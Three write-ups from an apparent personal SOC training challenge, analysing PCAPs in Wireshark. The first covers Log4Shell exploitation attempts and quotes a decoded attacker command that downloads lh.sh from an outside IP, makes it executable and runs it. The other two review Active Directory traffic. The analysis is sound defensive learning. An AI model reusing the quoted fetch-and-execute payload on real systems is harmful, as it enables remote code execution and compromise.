# Day01 - Log4Shell (CVE-2021-44228) Threat Hunting & Incident Investigation

## Overview

This project documents a SOC-style investigation of a packet capture (PCAP) containing Log4Shell (CVE-2021-44228) exploitation attempts. The analysis was performed using Wireshark to identify malicious activity, investigate attacker behavior, and determine whether the target system was successfully compromised.

## Objectives

- Analyze network traffic within the PCAP file.
- Identify suspicious hosts and protocols.
- Detect Log4Shell exploitation attempts.
- Extract and analyze malicious payloads.
- Verify whether exploitation was successful.
- Document findings and Indicators of Compromise (IOCs).

## Investigation Workflow

1. Protocol Hierarchy Analysis
2. Endpoint Identification
3. HTTP Traffic Inspection
4. JNDI/LDAP Payload Hunting
5. Payload Extraction and Decoding
6. Exploitation Verification
7. Incident Assessment

## Key Findings

- Identified multiple Log4Shell exploitation attempts targeting a public-facing server.
- Discovered JNDI LDAP payloads embedded within HTTP requests.
- Observed both vulnerability scanning and active exploitation activity.
- Extracted a Base64-encoded payload intended to download and execute a shell script.
- Identified attacker infrastructure associated with the exploit attempts.
- Found no evidence of successful LDAP callbacks or malware execution.

## Indicators of Compromise (IOCs)

| Type | Value |
|--------|--------|
| Target Host | 198.71.247.91 |
| Attacker IP | 45.137.21.9 |
| Payload Server | 62.210.130.250 |
| Vulnerability | CVE-2021-44228 (Log4Shell) |
| Downloaded File | lh.sh |

## Malicious Payload Analysis

The following Base64-encoded command was extracted from a JNDI LDAP payload:

```bash
wget http://62.210.130.250/lh.sh;
chmod +x lh.sh;
./lh.sh
```

### Attacker Intent

1. Download a remote shell script.
2. Grant execution permissions.
3. Execute the downloaded script.
4. Achieve Remote Code Execution (RCE) on the target system.

## Investigation Outcome

The analysis confirmed multiple Log4Shell exploitation attempts against the target server. Attackers leveraged JNDI LDAP payloads and command execution techniques commonly associated with Log4Shell attacks.

Although exploitation attempts were clearly observed, no evidence was found indicating:

- Successful LDAP callback activity
- Malware downloads
- Reverse shell connections
- Command-and-Control (C2) communication
- Successful system compromise

Based on the available network evidence, the activity was classified as **Attempted Exploitation** rather than a confirmed compromise.

## Tools Used

- Wireshark
- TCP Stream Analysis
- HTTP Protocol Analysis
- Base64 Payload Decoding

## Skills Demonstrated

- Network Traffic Analysis
- Threat Hunting
- Incident Investigation
- IOC Identification
- Payload Analysis
- Wireshark Packet Analysis
- Log4Shell Detection
- SOC Analyst Methodology


## Disclaimer

This investigation was conducted in a controlled learning environment for educational and cybersecurity training purposes. All analysis was performed on provided packet capture data without interacting with live systems.


# Day 2 – Wireshark Traffic Analysis & SOC Investigation

## PCAP link - https://www.malware-traffic-analysis.net/2026/02/28/index.html

## Overview
As part of my **30 Days of Wireshark & SOC Analyst Challenge**, I analyzed a PCAP file to understand network behavior, identify key hosts, and practice structured SOC investigation techniques.

## Objectives
- Analyze network traffic using Wireshark
- Identify major protocols in use
- Investigate endpoints and conversations
- Review DNS and HTTP activity
- Develop hypothesis-driven investigation skills

## Investigation Steps
1. Protocol Hierarchy Analysis
2. IPv4 Conversation Analysis
3. Endpoint Identification
4. DNS Investigation
5. HTTP Traffic Review
6. Initial Threat Assessment

## Key Findings
- Identified a Windows Active Directory environment
- Observed DNS, HTTP, SMB, LDAP, Kerberos, and TLS traffic
- Determined the primary workstation under investigation
- Reviewed Microsoft and Akamai-related communications
- No confirmed indicators of compromise (IOCs) were identified during initial analysis

## Skills Practiced
- Network Traffic Analysis
- Wireshark Investigation
- DNS Analysis
- HTTP Analysis
- Endpoint Identification
- SOC Triage Methodology
- Threat Hunting Fundamentals

## Tools Used
- Wireshark

## Key Learning
Understanding **normal network behavior** is the foundation of effective threat hunting and incident investigation. Before identifying malicious activity, a SOC analyst must first establish what "normal" looks like within the environment.

---
**Author:** Shubh Das  

---

# Traffic Analysis Exercise #3 - Active Directory Traffic Investigation

## PCAP Link - https://www.malware-traffic-analysis.net/2026/01/31/index.html

## Overview

This repository contains the investigation notes and findings from a Wireshark PCAP analysis focused on Windows Active Directory traffic. The objective was to identify host communications, analyze protocol behavior, and determine whether the observed activity represented normal domain operations or potential malicious behavior.

## Objectives

- Analyze a real-world PCAP file using Wireshark
- Identify the most active hosts and conversations
- Investigate SMB, LDAP, Kerberos, and RPC traffic
- Understand Active Directory-related communications
- Practice a SOC-style investigation workflow

## Investigation Summary

### Capture Statistics

| Metric | Value |
|----------|----------|
| Total Packets | 51,181 |
| Capture Duration | 10 Minutes 23 Seconds |
| Capture Size | 27 MB |
| Average Packet Size | 516 Bytes |

### Key Hosts Identified

| IP Address | Description |
|------------|------------|
| 10.1.21.58 | Internal Host |
| 10.1.21.2 | Internal Host |
| 104.21.46.67 | Cloudflare |
| 153.92.1.49 | Hostinger |
| 142.251.116.95 | Google |

### Major Protocols Observed

- SMB2
- DCE/RPC
- SAMR
- LSARPC
- Kerberos
- LDAP
- TLS

## Analysis Performed

### Host Communication Analysis

The majority of traffic occurred between:

10.1.21.58 ↔ 10.1.21.2

Analysis of conversations revealed communication over:

| Port | Service |
|--------|---------|
| 88 | Kerberos |
| 135 | RPC Endpoint Mapper |
| 389 | LDAP |
| 445 | SMB |

These protocols are commonly associated with Active Directory environments.

### SMB Investigation

Observed:

- Tree Connect Requests
- IPC$ Share Access
- SAMR Operations
- User and Group Enumeration

Examples:

- EnumDomains
- LookupDomain
- OpenUser
- QueryUserInfo
- GetGroupsForUser

### Kerberos Investigation

Observed:

- AS-REQ
- AS-REP
- TGS-REQ
- TGS-REP

These exchanges indicate normal Kerberos authentication activity within a Windows domain environment.

### LDAP Investigation

Observed:

- bindRequest
- bindResponse
- searchRequest

These requests suggest directory service queries and Active Directory interactions.

## Key Findings

### Confirmed

- Active communication between two internal systems
- Use of Active Directory-related protocols
- User and group information queries
- Kerberos authentication exchanges
- SMB administrative share access (IPC$)

### Not Observed

- Malware execution
- Command and Control (C2) traffic
- Data exfiltration
- Malicious file transfers
- Lateral movement activity

## Skills Demonstrated

- Wireshark Traffic Analysis
- Protocol Hierarchy Analysis
- Endpoint Analysis
- Conversation Analysis
- SMB Investigation
- LDAP Investigation
- Kerberos Analysis
- Active Directory Traffic Recognition
- SOC Investigation Methodology

## Learning Outcomes

This investigation highlighted the importance of understanding Windows networking protocols before drawing security conclusions.

Key concepts explored:

- SMB & IPC$
- LDAP
- Kerberos
- Active Directory
- RPC
- SAMR
- Windows Domain Communications

A major takeaway was learning how normal Active Directory operations can appear complex and suspicious when protocol behavior is not fully understood.

## Conclusion

Based on the evidence collected, the traffic appears consistent with normal Windows Active Directory operations. No confirmed indicators of compromise were identified during the investigation.

This exercise provided valuable experience in recognizing Windows domain traffic patterns and reinforced the importance of protocol knowledge during network investigations.

---

**Tools Used**
- Wireshark
- AbuseIPDB
- Windows Networking Concepts
- Active Directory Fundamentals

**Author:** Shubh Das  
**Focus Area:** SOC Analysis | Network Traffic Analysis | Threat Hunting
